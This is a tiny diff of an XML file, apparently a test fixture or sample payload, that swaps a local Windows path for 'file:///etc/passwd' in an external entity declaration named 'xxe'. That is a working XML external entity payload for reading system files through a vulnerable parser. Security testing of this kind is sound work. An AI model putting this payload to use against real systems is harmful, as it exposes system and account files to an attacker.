@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE model [
-<!ENTITY xxe SYSTEM "C:\Users\Gleb\Desktop\pssw">
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <model>
     <id>2</id>
